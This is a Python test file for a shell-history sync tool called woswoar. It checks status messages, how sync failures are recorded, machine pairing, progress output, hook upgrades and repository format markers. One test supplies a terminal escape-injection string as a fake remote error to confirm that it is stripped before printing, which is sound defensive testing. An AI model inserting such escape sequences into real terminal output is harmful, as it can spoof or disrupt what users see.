            beta.record("2023-11-15", 1_700_100_001, "beta history")
            sync.run()
        with alpha.active():
            # The timer, which runs once a minute. `status` reports what the
            # last sync brought in rather than fetching, so a beta that has not
            # arrived here yet is correctly nothing for alpha to decide about.
            sync.run()
        return alpha, beta

    def test_it_names_the_machine_waiting_and_the_command_to_run(self) -> None:
        alpha, _ = self.two_machines()
        ran = self.run_cli(alpha)
        self.assertIn("martin@laptop", ran.out)
        self.assertIn("woswoar accept", ran.out)

    def test_it_asks_nothing_and_changes_nothing(self) -> None:
        """The whole reason this reports rather than offers.

        `input` raises, so a status line that grew a prompt fails here rather
        than teaching someone to answer one they did not go looking for.
        """
        alpha, _ = self.two_machines()
        with alpha.active():
            before = sync.State.load()
            granted, signers = set(before.granted), dict(before.signers)

        def never(prompt: str = "") -> str:
            raise AssertionError(f"the status line asked a question: {prompt!r}")

        with mock.patch("builtins.input", never):
            self.assertEqual(self.run_cli(alpha).code, 0)

        with alpha.active():
            after = sync.State.load()
        self.assertEqual(set(after.granted), granted, "status granted something")
        self.assertEqual(dict(after.signers), signers, "status trusted something")

    def test_it_does_not_reach_the_network(self) -> None:
        """Typed for its own sake, so it answers from what is already here --
        and the timer fetches once a minute regardless."""
        alpha, _ = self.two_machines()

        def refuse(*args: object, **kwargs: object) -> None:
            raise AssertionError("the status line fetched")

        with mock.patch.object(sync, "_refresh", refuse):
            self.assertEqual(self.run_cli(alpha).code, 0)

    def test_a_settled_machine_is_told_to_press_ctrl_r(self) -> None:
        alpha, _ = self.two_machines()
        self.run_cli(alpha, "accept", "--yes")
        self.assertIn("Ctrl-R", self.run_cli(alpha).out)

    def test_a_changed_key_is_routed_to_trust_replace_not_accept(self) -> None:
        alpha, beta = self.two_machines()
        self.run_cli(alpha, "accept", "--yes")
        with beta.active():
            store.signing_key_file().unlink()
            beta.record("2023-11-16", 1_700_200_001, "after the key changed")
            sync.run()
        with alpha.active():
            sync.run()

        out = self.run_cli(alpha).out
        self.assertIn("trust --replace", out)
        self.assertNotIn("woswoar accept", out)


class TestABackgroundSyncThatKeepsFailing(SyncTestCase):
    """A sync fired from the prompt is detached and its output goes nowhere.

    The systemd timer at least had the journal. Nobody reads the journal either,
    but "nowhere" is a step down from "somewhere", so the failure is recorded
    where the bare `woswoar` will put it in front of someone. See #134.
    """

    MESSAGE = "could not connect to the remote"

    @contextmanager
    def broken_export(self) -> Iterator[None]:
        """Make the export step raise, as a broken remote would."""

        def boom(*args: object, **kwargs: object) -> None:
            raise errors.SyncError(self.MESSAGE)

        with mock.patch.object(sync, "export", boom):
            yield

    def failing(self, alpha: Fake, tty: bool = False) -> support.Ran:
        with self.broken_export():
            return self.run_cli(alpha, "sync", tty=tty)

    def test_the_failure_is_kept_and_shown_by_the_bare_command(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()
        self.assertEqual(self.failing(alpha).code, 1)

        out = self.run_cli(alpha).out
        self.assertIn("could not connect to the remote", out)
        self.assertIn("woswoar sync", out)

    def test_a_sync_that_works_clears_it_again(self) -> None:
        """Otherwise the first failure is reported forever, which teaches people
        to read past the one line this exists to make them read."""
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()
        self.failing(alpha)
        self.run_cli(alpha, "sync")
        self.assertNotIn("could not connect", self.run_cli(alpha).out)

    def test_nothing_is_said_when_nothing_has_failed(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()
        self.assertNotIn("failing", self.run_cli(alpha).out)

    def test_an_unreadable_record_is_not_a_broken_status_line(self) -> None:
        """`woswoar` on its own is what someone types when something is wrong.

        It reporting on a background failure must not be a second way for it to
        fail -- so a damaged record degrades to silence, the same way
        `State.load` treats a value it cannot read.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()
            store.sync_failure_file().write_text("{not json", encoding="utf-8")
            self.assertIsNone(sync.last_failure())
        self.assertEqual(self.run_cli(alpha).code, 0)

    def test_an_escape_sequence_in_the_message_is_defanged(self) -> None:
        """The message can carry a remote's text -- a git error quotes the URL
        and the server's reply -- and this is printed straight to a terminal."""
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()
            sync.record_failure("remote said \x1b[2J\x1b]0;pwned\x07 no")
        out = self.run_cli(alpha).out
        self.assertNotIn("\x1b", out)
        self.assertIn("remote said", out)

    def test_a_failure_a_person_is_watching_is_not_recorded(self) -> None:
        """Somebody who types `woswoar sync`, reads the error and deals with it
        must not then be told by every later `woswoar` that a *background* sync
        has been failing -- with "run woswoar sync" as the remedy, which is the
        command they just ran.

        The question asked is whether anyone was watching, not which subcommand
        this was: a terminal on stderr is the same test `progress.to_terminal`
        makes, and it means the message has already been read.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()
        self.failing(alpha, tty=True)
        with alpha.active():
            self.assertIsNone(sync.last_failure())

    def test_a_hand_run_sync_that_works_clears_a_background_failure(self) -> None:
        """Whoever fixed the problem should not have to wait for a background
        run to stop being told about it."""
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()
        self.failing(alpha)
        self.run_cli(alpha, "sync", tty=True)
        with alpha.active():
            self.assertIsNone(sync.last_failure())


class TestNewcomersIsAskedDirectly(SyncTestCase):
    """The pairing decides who is offered read access, so it is asserted here
    rather than through `accept`'s stdout -- which is the rule `Reader`'s own
    docstring states and the one place the new seam was not following it."""

    def test_this_machine_is_not_a_newcomer_to_itself(self) -> None:
        alpha = self.machine("alpha", display="martin@desktop")
        with alpha.active():
            sync.run()
            self.assertEqual(sync.newcomers().machines, [])

    def test_the_enrolled_list_is_every_recipient_not_only_the_new_ones(self) -> None:
        """`grant` re-seals to all of them, so a partial list would narrow
        access to whoever happened to be pending."""
        alpha, _ = self.two()
        with alpha.active():
            pending = sync.newcomers()
            self.assertEqual(sorted(pending.enrolled), sorted(sync.recipients()))
            self.assertEqual(len(pending.machines), 1, "only the newcomer is pending")

    def test_a_machine_already_accepted_is_not_offered_again(self) -> None:
        alpha, _ = self.two()
        self.run_cli(alpha, "accept", "--yes")
        with alpha.active():
            self.assertEqual(sync.newcomers().machines, [])

    def test_the_reader_and_the_candidate_are_the_same_machine(self) -> None:
        alpha, beta = self.two()
        with beta.active():
            reads = crypto.recipient_for(sync.identity_path(store.machine())).strip()
            signs = sync.signing_public()
        with alpha.active():
            (machine,) = sync.newcomers().machines
        self.assertIsNotNone(machine.reader)
        self.assertIsNotNone(machine.candidate)
        assert machine.reader is not None and machine.candidate is not None
        self.assertEqual(machine.reader.key, reads)
        self.assertEqual(machine.candidate.verify_key, signs)
        self.assertEqual(machine.label, "martin@laptop")

    def two(self) -> tuple[Fake, Fake]:
        alpha = self.machine("alpha", display="martin@desktop")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "old history")
            sync.run()
        beta = self.machine("beta", display="martin@laptop")
        with beta.active():
            beta.record("2023-11-15", 1_700_100_001, "beta history")
            sync.run()
        return alpha, beta


class TestLongCommandsSayWhatTheyAreDoing(SyncTestCase):
    """Reported from a real setup: "some commands take a long time and do not
    print anything, so I don't know if they are doing something or hanging".

    Measured at two years of history: a first sync is 6.5 s and a grant 3.2 s,
    and neither wrote a character until it was finished. What a terminal shows
    is `tests/test_progress.py`; this is about the calls being *made*, from the
    loops where the time actually goes.
    """

    def days_of_history(self, alpha: Fake, days: int) -> None:
        for day in range(days):
            stamp = f"2024-{day // 28 + 1:02d}-{day % 28 + 1:02d}"
            alpha.record(stamp, 1_700_000_000 + day * 86400, f"command on day {day}")

    def test_a_first_sync_counts_the_days_it_is_sealing(self) -> None:
        alpha = self.machine("alpha", display="martin@desktop")
        with alpha.active():
            self.days_of_history(alpha, 40)
            with progress.recording() as said:
                sync.run()

        self.assertIn("phase:sealing this machine's history", said)
        # The count has to move, or it is a spinner: a bar stuck at 0/40 says
        # exactly as little as no bar at all.
        ticks = [line for line in said if line.startswith("tick:")]
        self.assertIn("tick:0/40 days", ticks)
        self.assertIn("tick:39/40 days", ticks)

    def test_merging_names_the_machine_it_is_reading(self) -> None:
        """ "reading history from 'martin@laptop'" -- not "host 3f2a...".

        The same fix that put a name in `grant`'s prompt puts one here, and this
        is the one place a name is worth more than a fingerprint: nobody is
        authorising anything, they are waiting.
        """
        alpha = self.machine("alpha", display="martin@desktop")
        beta = self.machine("beta", display="martin@laptop")
        with alpha.active():
            self.days_of_history(alpha, 30)
            sync.run()
            sync.grant()
        self.accept_everyone(beta)

        with beta.active(), progress.recording() as said:
            sync.run()

        # beta is reading alpha, so it is alpha's name that has to appear.
        self.assertIn("phase:reading history from martin@desktop", said)
        self.assertIn("tick:0/30 days", said)

    def test_grant_counts_the_keys_it_re_seals(self) -> None:
        alpha = self.machine("alpha", display="martin@desktop")
        with alpha.active():
            self.days_of_history(alpha, 25)
            sync.run()
            with progress.recording() as said:
                sync.grant()

        self.assertIn("phase:re-sealing the day keys", said)
        # 25 day keys plus this machine's sealed name.
        self.assertIn("tick:0/26 keys", said)
        self.assertIn("tick:25/26 keys", said)

    def test_an_idle_sync_still_has_nothing_to_count(self) -> None:
        """The timer runs this every minute; the loops must stay skipped."""
        alpha = self.machine("alpha")
        with alpha.active():
            self.days_of_history(alpha, 5)
            sync.run()
            with progress.recording() as said:
                sync.run()

        self.assertEqual([line for line in said if line.startswith("tick:")], [])


if __name__ == "__main__":
    unittest.main()


class TestAHookLeftBehindByAnUpgradeIsSurfaced(SyncTestCase):
    """`install` copies the hook, so upgrading the Python leaves old shell code.

    `doctor` reports it, but only somebody who already suspects a problem runs
    doctor -- and the symptom is that nothing syncs while every other line looks
    healthy. So the bare `woswoar` says it too, ahead of everything else.
    """

    def stale(self, alpha: Fake) -> None:
        with alpha.active():
            hook = store.data_dir() / HOOKS["bash"]
            hook.parent.mkdir(parents=True, exist_ok=True)
            hook.write_text("# woswoar, but from last year\n", encoding="utf-8")

    def test_the_bare_command_names_the_command_that_fixes_it(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()
        self.stale(alpha)
        out = self.run_cli(alpha).out
        self.assertIn("older woswoar", out)
        self.assertIn("woswoar install", out)

    def test_a_current_hook_says_nothing(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()
            pass
        self.run_cli(alpha, "install", "--rcfile", str(self.root / "bashrc"))
        self.assertNotIn("older woswoar", self.run_cli(alpha).out)

    def test_a_machine_with_no_hook_at_all_is_not_told_to_reinstall_it(self) -> None:
        """That is a different problem with a different fix, and `doctor` owns
        it. Saying "an older woswoar installed this" about a file that is not
        there would send someone looking for something that never existed."""
        alpha = self.machine("alpha")
        with alpha.active():
            sync.run()
        self.assertNotIn("older woswoar", self.run_cli(alpha).out)


class TestTheHookKeepsItselfUpToDate(SyncTestCase):
    """An upgrade should not need a second command (#136 follow-up).

    `install` copies the hook, so upgrading the program leaves the old shell
    code running. The hook now starts a `woswoar sync` about once a minute, so
    that sync is what notices -- an upgrade heals itself within a minute.
    """

    def install(self, alpha: Fake) -> Path:
        self.run_cli(alpha, "install", "--rcfile", str(self.root / "bashrc"))
        with alpha.active():
            return store.data_dir() / HOOKS["bash"]

    def test_a_stale_hook_is_brought_up_to_date_by_a_sync(self) -> None:
        alpha = self.machine("alpha")
        hook = self.install(alpha)
        hook.write_text("# woswoar, but from last year\n", encoding="utf-8")
        self.run_cli(alpha, "sync")
        self.assertEqual(hook.read_bytes(), main_hook_bytes("bash"))

    def test_the_bare_command_stops_reporting_it_afterwards(self) -> None:
        """The report and the repair have to agree, or somebody is told to run
        a command that has already been run for them."""
        alpha = self.machine("alpha")
        hook = self.install(alpha)
        hook.write_text("# older\n", encoding="utf-8")
        self.assertIn("older woswoar", self.run_cli(alpha).out)
        self.run_cli(alpha, "sync")
        self.assertNotIn("older woswoar", self.run_cli(alpha).out)

    def test_a_machine_with_no_hook_does_not_get_one(self) -> None:
        """It never ran `install`, so its `.bashrc` sources nothing. Writing a
        file nothing references would be a confusing way to say that."""
        alpha = self.machine("alpha")
        with alpha.active():
            hook = store.data_dir() / HOOKS["bash"]
            self.assertFalse(hook.exists(), "precondition: no hook installed")
        self.run_cli(alpha, "sync")
        with alpha.active():
            self.assertFalse(hook.exists())

    def test_an_unreachable_remote_does_not_keep_the_hook_stale(self) -> None:
        """The two have nothing to do with each other, and a machine that
        cannot reach its remote is exactly one nobody is attending to."""
        alpha = self.machine("alpha")
        hook = self.install(alpha)
        hook.write_text("# older\n", encoding="utf-8")

        def boom(*args: object, **kwargs: object) -> None:
            raise errors.SyncError("could not connect to the remote")

        with mock.patch.object(sync, "export", boom):
            self.assertEqual(self.run_cli(alpha, "sync").code, 1)
        self.assertEqual(hook.read_bytes(), main_hook_bytes("bash"))

    def test_a_current_hook_is_left_exactly_alone(self) -> None:
        """Rewriting an identical file once a minute is a pointless write, and
        it would reset the mtime every time on a file `doctor` reports on."""
        alpha = self.machine("alpha")
        hook = self.install(alpha)
        before = hook.stat().st_mtime_ns
        self.run_cli(alpha, "sync")
        self.assertEqual(hook.stat().st_mtime_ns, before)

    def test_a_read_only_data_directory_does_not_stop_the_sync(self) -> None:
        """Repairing the hook is a courtesy; syncing is the job."""
        alpha = self.machine("alpha")
        hook = self.install(alpha)
        hook.write_text("# older\n", encoding="utf-8")
        with mock.patch.object(Path, "write_bytes", side_effect=OSError("read-only")):
            self.assertEqual(self.run_cli(alpha, "sync").code, 0)


class TestTheStatusLineOnAMachineThatCannotReadYet(SyncTestCase):
    """The screen a new machine actually gets, reported from a real install:

        3 machine(s) waiting to be accepted here:
            '(unnamed)'
            '(unnamed)'
            '(unnamed)'

    A name lives in `hosts/<id>/name.age`, sealed to the recipients, so a
    machine nobody has granted yet cannot open one of them. That part is
    working as designed -- but three identical placeholders distinguish
    nothing, and `accept` here does not get that machine any history.
    """

    def joined_but_not_granted(self) -> tuple[Fake, list[Fake]]:
        """A newcomer, and the machines that have not accepted it yet."""
        others = []
        for name in ("alpha", "beta"):
            machine = self.machine(name, display=f"martin@{name}")
            with machine.active():
                machine.record("2023-11-14", 1_700_000_001, f"{name} history")
                sync.run()
            others.append(machine)
        newcomer = self.machine("newcomer", display="martin@newcomer")
        with newcomer.active():
            newcomer.record("2023-11-15", 1_700_100_001, "its own history")
            sync.run()
        return newcomer, others

    def test_each_machine_is_told_apart_by_its_fingerprint(self) -> None:
        newcomer, _ = self.joined_but_not_granted()
        out = self.run_cli(newcomer).out
        lines = [line for line in out.splitlines() if "(unnamed)" in line]
        self.assertEqual(len(lines), 2, f"expected two unnamed machines:\n{out}")
        self.assertEqual(len(set(lines)), 2, f"the two lines are identical:\n{out}")

    def test_it_says_why_they_have_no_names_and_what_is_missing(self) -> None:
        """`accept` on this machine changes nothing about what it can read, and
        a screen that only says `Next: woswoar accept` sends someone to it."""
        newcomer, _ = self.joined_but_not_granted()
        out = self.run_cli(newcomer).out
        self.assertIn("sealed", out, "it does not say why they have no names")
        self.assertIn("already use", out, "the other-machine step is missing")
        # Both, and in that order: the explanation has to come before the
        # commands, or "Next: woswoar accept" is immediately contradicted.
        self.assertLess(out.index("sealed"), out.index("Next:"))

    def test_a_machine_that_can_read_is_not_lectured(self) -> None:
        """Once granted, the names resolve and the explanation would be noise --
        and worse, wrong."""
        newcomer, others = self.joined_but_not_granted()
        for machine in others:
            self.run_cli(machine, "accept", "--yes")
        with newcomer.active():
            sync.run()
        out = self.run_cli(newcomer).out
        self.assertNotIn("already use", out)
        self.assertNotIn("sealed", out)
        self.assertIn("Next:  woswoar accept", out, "it still has to name the step")

    def test_the_fingerprint_is_the_one_accept_will_ask_about(self) -> None:
        """Two screens describing one decision have to name it the same way, or
        checking the first against the second proves nothing.

        Asserted against `candidate.fingerprint` -- the signing key, which is
        what `accept` prints and what `ssh-keygen -lf` reproduces on the machine
        itself -- and not against `Newcomer.fingerprint`. The first version did
        the latter, which is the same expression the code under test uses: both
        sides moved together, and a mutation swapping in the *reader's*
        fingerprint went unnoticed.
        """
        newcomer, _ = self.joined_but_not_granted()
        status = self.run_cli(newcomer).out
        with newcomer.active():
            pending = sync.local_newcomers().machines
        self.assertTrue(pending, "precondition: something is pending")
        for machine in pending:
            candidate = machine.candidate
            assert candidate is not None, "these machines all publish a signer"
            self.assertIn(candidate.fingerprint, status)
            self.assertTrue(
                candidate.fingerprint.startswith("SHA256:"),
                "that is not the signing fingerprint accept shows",
            )

    def test_a_peer_calling_itself_unnamed_does_not_look_unreadable(self) -> None:
        """`(unnamed)` is a string a peer can put in its own `name.age`, which
        sealing needs no secret to write -- so "has this name been read" cannot
        be answered by comparing against the placeholder's text. See `Name`.

        The cost of getting it wrong is that a machine which *can* read its
        peers is told it cannot, and pointed at a step it has already done.
        """
        others = []
        for name, display in (("alpha", sync.UNNAMED), ("beta", sync.UNNAMED)):
            machine = self.machine(name, display=display)
            with machine.active():
                machine.record("2023-11-14", 1_700_000_001, f"{name} history")
                sync.run()
            others.append(machine)
        newcomer = self.machine("newcomer", display="martin@newcomer")
        with newcomer.active():
            sync.run()
        for machine in others:
            self.run_cli(machine, "accept", "--yes")
        with newcomer.active():
            sync.run()

        out = self.run_cli(newcomer).out
        self.assertNotIn("sealed", out, "a readable name was read as unreadable")


class TestTheRepoSaysWhichShapeItIs(SyncTestCase):
    """`history/FORMAT`, and the migration it exists to make possible.

    The marker is worth nothing on the day it lands and everything on the day a
    layout changes -- and by then it cannot be added, because the machines that
    would have to be migrated are running versions that never wrote it. So what
    is pinned here is the part that has to be right *now*: every repo acquires
    it without anyone running anything, an unmarked repo keeps working, and a
    repo from the future is refused rather than half-written.
    """

    def marker(self, fake: Fake) -> str:
        with fake.active():
            path = archive.format_file()
            return path.read_text(encoding="utf-8") if path.is_file() else ""

    def publish_marker(self, fake: Fake, content: str | None) -> None:
        """Put ``content`` in the repo's marker -- or remove it, for ``None`` --
        and push, so every machine's next fetch sees it.

        `sync.run` first, because every `self.machine(...)` pushes as it enrols:
        a hand-made commit on top of a stale tree is rejected by the remote
        rather than tested. Pushed rather than left local because each of the
        checks under test reads what the *fetch* brought, so a marker only this
        machine can see would prove nothing about the others.
        """
        with fake.active():
            sync.run()
            if content is None:
                archive.format_file().unlink()
                gitrepo.git("rm", "--quiet", "--cached", archive.FORMAT)
            else:
                store.write_atomic(archive.format_file(), content.encode("utf-8"))
                gitrepo.git("add", archive.FORMAT)
            gitrepo.git("commit", "--quiet", "-m", "the marker, as another version left it")
            gitrepo.git("push", "--quiet", "origin", "HEAD")
        self.assertEqual(self.marker(fake), content or "", "the fixture did not take")

    def strip_marker(self, fake: Fake) -> None:
        """The repository as it was before the marker existed."""
        self.publish_marker(fake, None)

    def mark_future(self, fake: Fake) -> None:
        """A layout this woswoar does not know, as a newer one would write it."""
        self.publish_marker(fake, archive.format_content(archive.REPO_FORMAT + 1))

    def test_a_new_repo_records_its_format(self) -> None:
        alpha = self.machine("alpha")
        self.assertEqual(self.marker(alpha), archive.FORMAT_CONTENT)

    def test_an_existing_repo_acquires_the_marker_on_sync(self) -> None:
        """The migration itself: a repository written before the marker existed
        gains it on the next ordinary sync, and the file is *committed* and
        pushed rather than left in the working tree for a later export to sweep
        up -- which on a machine that records nothing would be never.
        """
        alpha = self.machine("alpha")
        self.strip_marker(alpha)

        with alpha.active():
            # Nothing recorded since, so there is nothing to export: the marker
            # has to be enough on its own to make this run commit and push.
            sync.run()

        self.assertEqual(self.marker(alpha), archive.FORMAT_CONTENT)
        self.assertIn(
            archive.FORMAT, self.git_in_repo(alpha, "ls-tree", "--name-only", "HEAD").split()
        )
        self.assertIn(
            archive.FORMAT,
            self.git_in_repo(alpha, "ls-tree", "--name-only", "origin/HEAD").split(),
            "the marker never reached the remote, so no other machine sees it",
        )

    def test_an_absent_marker_is_not_a_failure(self) -> None:
        """An older repository is this shape, so it goes on working: a full
        two-machine exchange against a repo whose marker has been removed, and
        whose removal is on the remote before either machine syncs again."""
        # `history_across_days` is alpha with history, beta enrolled after it,
        # and the `grant` in between that re-seals the day keys to whoever is in
        # recipients.txt by then.
        alpha, beta = self.history_across_days(days=1, per_day=1)
        self.accept_everyone(beta)
        self.strip_marker(alpha)

        with beta.active():
            report = sync.run()
            # Inside `active()`: `commands()` reads the *ambient* environment,
            # so asking outside it answers with the developer's own history --
            # a test that passes or fails on what someone typed today.
            merged = beta.commands()

        self.assertEqual(merged, {"day 0 command 0"})
        self.assertEqual(report.lines_imported, 1)

    def test_a_sync_refuses_a_newer_repo_format(self) -> None:
        """A repo written by a woswoar this one does not understand stops the
        run before it exports or merges anything. Not only the merge: this
        machine publishing into a layout it cannot read would be permanent,
        because nothing in the repo is ever rewritten."""
        alpha, beta = self.history_across_days(days=1, per_day=1)
        self.accept_everyone(beta)
        self.mark_future(alpha)

        with beta.active():
            beta.record("2023-11-15", 1_700_100_001, "beta was here")
            with self.assertRaises(errors.SyncError) as caught:
                sync.run()
            # Nothing merged, and nothing published either.
            self.assertEqual(beta.commands(), {"beta was here"}, "alpha's history was merged")
            self.assertEqual(
                list(archive.iter_chunks(beta.id)), [], "it published into a repo it cannot read"
            )

        message = str(caught.exception)
        self.assertIn(str(archive.REPO_FORMAT + 1), message, message)
        self.assertIn(str(archive.REPO_FORMAT), message, message)

    def test_content_that_does_not_parse_is_not_a_wedge(self) -> None:
        """Anyone who can push can write this file, so garbage in it must not be
        able to stop every machine syncing. It reads as "no marker", which is
        the same answer as an old repo -- unlike a legible higher number, which
        a newer woswoar wrote on purpose.

        The superscript is not decoration. `"\u00b2".isdigit()` is True and
        `int("\u00b2")` raises, so a version check written with `isdigit`
        crashes every sync on four bytes anyone with push access can write --
        which is this test's whole subject, and `b"gibberish"` alone never
        reaches it.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            for junk in (
                b"gibberish\n",
                b"woswoar-repo-\n",
                b"woswoar-repo-two\n",
                "woswoar-repo-\u00b2\n".encode(),
            ):
                store.write_atomic(archive.format_file(), junk)
                self.assertIsNone(archive.repo_format(), junk.decode(errors="replace"))
                # Not just the parse: the whole sync path has to survive it.
                sync.run()

            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()

        self.assertEqual(report.chunks_written, 1)

    def test_two_machines_writing_the_marker_do_not_conflict(self) -> None:
        """Both sides create the file from a state where neither has it, and a
        real rebase over a real bare remote has to absorb that.

        This is why the file is written only when absent and never rewritten to
        match: two machines on different versions taking turns overwriting one
        line would conflict on every sync, forever.
        """
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        self.strip_marker(alpha)
        with beta.active():
            # Beta's own tree back to the same state, without syncing -- a fetch
            # here would be one machine learning about the other, which is the
            # thing this test needs not to have happened yet.
            gitrepo.git("fetch", "--quiet", "origin")
            gitrepo.git("reset", "--hard", "--quiet", "origin/HEAD")
            self.assertFalse(archive.format_file().is_file(), "the fixture still has the marker")

            # Committed locally and deliberately not pushed, so alpha's marker
            # lands on the remote first and beta's arrives on top of it.
            beta.record("2023-11-14", 1_700_000_002, "beta was here")
            sync.run(push=False)

        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "alpha was here")
            sync.run()
        with beta.active():
            sync.run()

        for machine in (alpha, beta):
            self.assertEqual(self.marker(machine), archive.FORMAT_CONTENT)
            self.assertNotIn(
                "<<<<<<<",
                self.marker(machine),
                "git three-way merged a file that should never have needed one",
            )

    def test_joining_a_newer_repo_is_refused_before_anything_is_enrolled(self) -> None:
        """`init` is the one that matters most: a machine that enrols publishes
        a key, a signer and a sealed name into a layout it cannot read, and
        nothing in this repository is ever rewritten."""
        alpha = self.machine("alpha")
        self.mark_future(alpha)
        with alpha.active():
            before = archive.recipients_file().read_text(encoding="utf-8")

        with self.assertRaises(errors.SyncError):
            self.machine("beta")

        with alpha.active():
            gitrepo.git("fetch", "--quiet", "origin")
            gitrepo.git("reset", "--hard", "--quiet", "origin/HEAD")
            self.assertEqual(
                archive.recipients_file().read_text(encoding="utf-8"),
                before,
                "the newcomer enrolled into a repo it had already been told to refuse",
            )

    def test_grant_refuses_a_newer_repo_format(self) -> None:
        """`grant` rewrites every sealed key file, which is a larger write than
        a sync makes -- so it is gated on the same question."""
        alpha, beta = self.history_across_days(days=1, per_day=1)
        self.accept_everyone(beta)
        self.mark_future(alpha)

        with alpha.active():
            sealed = archive.day_key(alpha.id, "2023-11-14").read_bytes()
            with self.assertRaises(errors.SyncError):
                sync.grant()
            self.assertEqual(
                archive.day_key(alpha.id, "2023-11-14").read_bytes(),
                sealed,
                "the day key was re-sealed into a repo this version cannot read",
            )

    def test_compact_refuses_a_newer_repo_format(self) -> None:
        """The only routine operation that deletes files, so the last place this
        can be allowed to run blind. It never fetches, so the check reads the
        local checkout -- which is what a fetch left there."""
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(3):
                alpha.record("2023-11-14", 1_700_000_001 + i, f"command {i}")
                sync.run()
            chunks = len(list(archive.iter_chunks(alpha.id)))
        self.assertGreater(chunks, 1, "nothing to compact, so the fixture proves nothing")
        self.mark_future(alpha)

        with alpha.active():
            with self.assertRaises(errors.SyncError):
                sync.compact(before="2023-11-15")
            self.assertEqual(
                len(list(archive.iter_chunks(alpha.id))), chunks, "chunks were deleted anyway"
            )

    def test_doctor_reports_the_format_the_repo_is(self) -> None:
        """The marker is a file nobody would think to `cat`, and a working sync
        never mentions it. `doctor` is where it becomes visible."""
        alpha = self.machine("alpha")
        self.assertRegex(
            self.run_cli(alpha, "doctor").out, rf"\[ok\] repo format\s+{archive.REPO_FORMAT}\b"
        )

    def test_doctor_says_what_a_refused_repo_needs(self) -> None:
        """The same judgement `sync` refuses on, rendered rather than re-derived
        -- a doctor that reported the old rule after the rule changed would be
        worse than one that said nothing."""
        alpha = self.machine("alpha")
        self.mark_future(alpha)

        out = self.run_cli(alpha, "doctor").out
        self.assertRegex(out, r"\[FAIL\] repo format")
        self.assertIn(str(archive.REPO_FORMAT + 1), out)
        self.assertIn("upgrade woswoar", out)
